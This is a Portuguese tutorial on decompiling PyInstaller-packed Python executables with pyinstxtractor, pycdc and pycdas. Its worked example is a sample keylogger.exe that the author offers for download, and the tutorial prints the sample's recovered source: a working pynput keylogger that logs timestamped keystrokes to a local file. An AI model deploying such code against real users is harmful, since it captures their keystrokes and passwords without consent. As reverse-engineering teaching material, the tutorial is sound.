
## ENGENHARIA REVERSA EM EXECUTAVEIS PYTHON

<hr>

# PREPARANDO AMBIENTE

Antes de mais nada, é necessario baixar os pacotes necessarios para trabalhar
```
apt install git cmake build-essential python
```

Primeiro é necessario fazer o download do pacote do pyinstxtractor, ferramenta responsavel por desempacotar os bytecodes do seu executavel python
```
git clone https://github.com/extremecoders-re/pyinstxtractor/
```

Dentro deve haver um arquivo .py 
```
(global) messias@debian:~/binarios$ cd pyinstxtractor/
(global) messias@debian:~/binarios/pyinstxtractor$ ls
LICENSE  pyinstxtractor.py  README.md
(global) messias@debian:~/binarios/pyinstxtractor$
```

Tambem podemos instalar o PYCDC, uma ferramenta feita em C++ capaz de decompilar as instruções bytecodes do arquivo pyc, tentando assim trazer o codigo py original
```
git clone https://github.com/zrax/pycdc
```
para podermos usar o o pycdc, é necessarios compilar o script
```
(global) messias@debian:~/binarios$ cd pycdc/
(global) messias@debian:~/binarios/pycdc$ cmake .
-- The C compiler identification is GNU 13.2.0
-- The CXX compiler identification is GNU 13.2.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/messias/binarios/pycdc
(global) messias@debian:~/binarios/pycdc$ make
[  2%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o
[  4%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o
[  7%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o
[  9%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o
[ 11%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o
[ 14%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o
[ 16%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o
[ 19%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o
[ 21%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_0.cpp.o
[ 23%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_1.cpp.o
[ 26%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_3.cpp.o
[ 28%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_4.cpp.o
[ 30%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_5.cpp.o
[ 33%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_1_6.cpp.o
[ 35%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_0.cpp.o
[ 38%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_1.cpp.o
[ 40%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_2.cpp.o
[ 42%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_3.cpp.o
[ 45%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_4.cpp.o
[ 47%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_5.cpp.o
[ 50%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_6.cpp.o
[ 52%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_2_7.cpp.o
[ 54%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_0.cpp.o
[ 57%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_1.cpp.o
[ 59%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_2.cpp.o
[ 61%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_3.cpp.o
[ 64%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_4.cpp.o
[ 66%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_5.cpp.o
[ 69%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_6.cpp.o
[ 71%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_7.cpp.o
[ 73%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_8.cpp.o
[ 76%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_9.cpp.o
[ 78%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_10.cpp.o
[ 80%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_11.cpp.o
[ 83%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_3_12.cpp.o
[ 85%] Linking CXX static library libpycxx.a
[ 85%] Built target pycxx
[ 88%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o
[ 90%] Linking CXX executable pycdas
[ 90%] Built target pycdas
[ 92%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o
[ 95%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o
[ 97%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o
[100%] Linking CXX executable pycdc
[100%] Built target pycdc
```
Agora teremos 2 novos arquivos compilados
```
(global) messias@debian:~/binarios/pycdc$ ls pycdc pycdas
pycdas  pycdc
```
#### pycdas
é um analizador de bytecodes, com esse script podemos analizar a estrutura de um arquivo pyc antes de tentar decompila-lo, isso pode ser muito util para tentanr entender a estrutura de um bytecode python

#### pycdc
é o decompilador, com ele podemos tentar decompilar um arquivo pyc, trazendo ele de volta para um py legivel.

<hr>

# MÃO NA MASSA

Agora que temos de fato as ferramentas necessarias instaladas, podemos decompilar nosso primeiro script python
<br><br>
Nesse exemplo, vou usar o arquivo "keylogger.exe" que esta disponivel para download nesse repositorio, junto a outros arquivos.
```
(global) messias@debian:~/binarios$ ls -l keylogger.exe
.rw-r--r-- messias messias 3.8 MB Sat Jul  6 22:16:51 2024  keylogger.exe
(global) messias@debian:~/binarios$ file keylogger.exe 
keylogger.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
(global) messias@debian:~/binarios$ 
```
Aqui confirmamos que o script em questão é um PE (Portable executable)
<br> <br>
Para garantir que o PE é na verdade um script em python, podemos usar o "strings"
```
(global) messias@debian:~/binarios$ strings keylogger.exe | grep python
bpython27.dll
python27.dll
(global) messias@debian:~/binarios$ 
```
Aqui podemos ver que o script carrega 2 dll "bpython27.dll e python27.dll"
<br><br>
Ao carregar a python27.dll, podedmos notar que o script carrega o interpretador principal do python em sua versão 2.7, isso é um indicativo muito forte de que isso na verdade se trata de um script python compilado.<br><br>
Para termos certeza, podemos tentar usar o pyinstxtractor para desempacotar os componentes python do script executavel
```
(global) messias@debian:~/binarios$ python3 pyinstxtractor/pyinstxtractor.py keylogger.exe 
[+] Processing keylogger.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 2.7
[+] Length of package: 3738242 bytes
[+] Found 18 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: keylogger.py.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 2.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: keylogger.exe

You can now use a python decompiler on the pyc files within the extracted directory
(global) messias@debian:~/binarios$ ls
keylogger.exe  keylogger.exe_extracted  pycdc  pyinstxtractor
(global) messias@debian:~/binarios$ 

```
Ao executar o pyinstxtractor, ele nos fornece alguns detalhes importantes, como
- Python version: 2.7
- Found 18 files in CArchive
- Please run this script in Python 2.7 to prevent extraction errors during unmarshalling

Ele identifica a versão 2.7 do python no script executavel, e nos recomenda executar o pyinstxtractor com python2 para evitar possiveis erros
<br><br>
Apesar de tudo, uma pasta foi criada "keylogger.exe_extracted"
```
(global) messias@debian:~/binarios/keylogger.exe_extracted$ ls
_hashlib.pyd                 msvcm90.dll              pyimod02_archive.pyc    select.pyd
bz2.pyd                      msvcp90.dll              pyimod03_importers.pyc  struct.pyc
keylogger.py.exe.manifest    msvcr90.dll              python27.dll            unicodedata.pyd
keylogger.py.pyc             pyiboot01_bootstrap.pyc  PYZ-00.pyz              
Microsoft.VC90.CRT.manifest  pyimod01_os_path.pyc     PYZ-00.pyz_extracted    
(global) messias@debian:~/binarios/keylogger.exe_extracted$
(global) messias@debian:~/binarios/keylogger.exe_extracted$ file keylogger.py.pyc 
keylogger.py.pyc: python 2.7 byte-compiled
(global) messias@debian:~/binarios/keylogger.exe_extracted$

```
Dentro ha todos os script necessarios para executar o programa python, como os dll do interpretador do python e tambem um arquivo ".manifest"
```
(global) messias@debian:~/binarios/keylogger.exe_extracted$ cat keylogger.py.exe.manifest
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity name="keylogger.py" processorArchitecture="amd64" type="win32" version="1.0.0.0"/>
  <dependency>
    <dependentAssembly>
      <assemblyIdentity name="Microsoft.VC90.CRT" processorArchitecture="amd64" publicKeyToken="1fc8b3b9a1e18e3b" type="win32" version="9.0.30729.9625"/>
      <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"/>
    </dependentAssembly>
  </dependency>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
      <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/>
      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
    </application>
  </compatibility>
```
Aqui podemos ver que o script principal do nosso executavel é o "keylogger.py" que ainda esta em formato byte-code, ou seja o script principal do nosso executavel é o keylogger.py.pyc
<br><br>
Usando pycdc podemos tentar decopilar os bytecodes trazendo eles assim para .py mais legivel.
```
(global) messias@debian:~/binarios/keylogger.exe_extracted$ ../pycdc/pycdc keylogger.py.pyc 
# Source Generated with Decompyle++
# File: keylogger.py.pyc (Python 2.7)

from pynput import keyboard
import datetime

def teclas(tecla):
    
    def salva(tecla):
        h = datetime.datetime.now()
        hora = h.strftime('%H:%M')
        with open('teclas.txt', 'a+') as f:
            f.write(hora + ': ' + str(tecla) + '\n')

    
    try:
        salva(tecla.char)
    except:
        salva(tecla)


with keyboard.Listener(on_press = teclas) as listener:
    listener.join()
(global) messias@debian:~/binarios/keylogger.exe_extracted$ 

```
Nesse exemplo, foi possivel obter todo codigo fonte original sem problemas, bem como os nomes originais das funções e variaveis, isso acontece pois no arquivo pyc essas informações ficam armazenadas como meta-dados.
<br><br>
Podemos ver essas informações usando o pycdas
```
(global) messias@debian:~/binarios/keylogger.exe_extracted$ ../pycdc/pycdas keylogger.py.pyc 
keylogger.py.pyc (Python 2.7)
[Code]
    File Name: keylogger.py.txt
    Object Name: <module>
    Arg Count: 0
    Locals: 0
    Stack Size: 5
    Flags: 0x00000040 (CO_NOFREE)
    [Names]
        'pynput'
        'keyboard'
        'datetime'
        'teclas'
        'Listener'
        'listener'
        'join'
    [Var Names]
    [Free Vars]
    [Cell Vars]
    [Constants]
        -1
        (
            'keyboard'
        )
        None
        [Code]
            File Name: keylogger.py.txt
            Object Name: teclas
            Arg Count: 1
            Locals: 2
            Stack Size: 3
            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
            [Names]
                'char'
            [Var Names]
                'tecla'
                'salva'
            [Free Vars]
            [Cell Vars]
            [Constants]
                None
                [Code]
                    File Name: keylogger.py.txt
                    Object Name: salva
                    Arg Count: 1
                    Locals: 4
                    Stack Size: 8
                    Flags: 0x00000053 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NESTED | CO_NOFREE)
                    [Names]
                        'datetime'
                        'now'
                        'strftime'
                        'open'
                        'write'
                        'str'
                    [Var Names]
                        'tecla'
                        'h'
                        'hora'
                        'f'
                    [Free Vars]
                    [Cell Vars]
                    [Constants]
                        None
                        '%H:%M'
                        'teclas.txt'
                        'a+'
                        ': '
                        '\n'
                    [Disassembly]
                        0       LOAD_GLOBAL                     0: datetime
                        3       LOAD_ATTR                       0: datetime
                        6       LOAD_ATTR                       1: now
                        9       CALL_FUNCTION                   0
                        12      STORE_FAST                      1: h
                        15      LOAD_FAST                       1: h
                        18      LOAD_ATTR                       2: strftime
                        21      LOAD_CONST                      1: '%H:%M'
                        24      CALL_FUNCTION                   1
                        27      STORE_FAST                      2: hora
                        30      LOAD_GLOBAL                     3: open
                        33      LOAD_CONST                      2: 'teclas.txt'
                        36      LOAD_CONST                      3: 'a+'
                        39      CALL_FUNCTION                   2
                        42      SETUP_WITH                      38 (to 83)
                        45      STORE_FAST                      3: f
                        48      LOAD_FAST                       3: f
                        51      LOAD_ATTR                       4: write
                        54      LOAD_FAST                       2: hora
                        57      LOAD_CONST                      4: ': '
                        60      BINARY_ADD                      
                        61      LOAD_GLOBAL                     5: str
                        64      LOAD_FAST                       0: tecla
                        67      CALL_FUNCTION                   1
                        70      BINARY_ADD                      
                        71      LOAD_CONST                      5: '\n'
                        74      BINARY_ADD                      
                        75      CALL_FUNCTION                   1
                        78      POP_TOP                         
                        79      POP_BLOCK                       
                        80      LOAD_CONST                      0: None
                        83      WITH_CLEANUP                    
                        84      END_FINALLY                     
                        85      LOAD_CONST                      0: None
                        88      RETURN_VALUE                    
            [Disassembly]
                0       LOAD_CONST                      1: <CODE> salva
                3       MAKE_FUNCTION                   0
                6       STORE_FAST                      1: salva
                9       SETUP_EXCEPT                    17 (to 29)
                12      LOAD_FAST                       1: salva
                15      LOAD_FAST                       0: tecla
                18      LOAD_ATTR                       0: char
                21      CALL_FUNCTION                   1
                24      POP_TOP                         
                25      POP_BLOCK                       
                26      JUMP_FORWARD                    17 (to 46)
                29      POP_TOP                         
                30      POP_TOP                         
                31      POP_TOP                         
                32      LOAD_FAST                       1: salva
                35      LOAD_FAST                       0: tecla
                38      CALL_FUNCTION                   1
                41      POP_TOP                         
                42      JUMP_FORWARD                    1 (to 46)
                45      END_FINALLY                     
                46      LOAD_CONST                      0: None
                49      RETURN_VALUE                    
        'on_press'
    [Disassembly]
        0       LOAD_CONST                      0: -1
        3       LOAD_CONST                      1: ('keyboard',)
        6       IMPORT_NAME                     0: pynput
        9       IMPORT_FROM                     1: keyboard
        12      STORE_NAME                      1: keyboard
        15      POP_TOP                         
        16      LOAD_CONST                      0: -1
        19      LOAD_CONST                      2: None
        22      IMPORT_NAME                     2: datetime
        25      STORE_NAME                      2: datetime
        28      LOAD_CONST                      3: <CODE> teclas
        31      MAKE_FUNCTION                   0
        34      STORE_NAME                      3: teclas
        37      LOAD_NAME                       1: keyboard
        40      LOAD_ATTR                       4: Listener
        43      LOAD_CONST                      4: 'on_press'
        46      LOAD_NAME                       3: teclas
        49      CALL_FUNCTION                   256
        52      SETUP_WITH                      17 (to 72)
        55      STORE_NAME                      5: listener
        58      LOAD_NAME                       5: listener
        61      LOAD_ATTR                       6: join
        64      CALL_FUNCTION                   0
        67      POP_TOP                         
        68      POP_BLOCK                       
        69      LOAD_CONST                      2: None
        72      WITH_CLEANUP                    
        73      END_FINALLY                     
        74      LOAD_CONST                      2: None
        77      RETURN_VALUE                    
```
Em alguns casos, essas instruções baixo nivel podem ajudar quando o codigo tiver funções que o pycdc não conseguir decompilar (isso é mais comum em codigo que usam a versão mais recente do python.
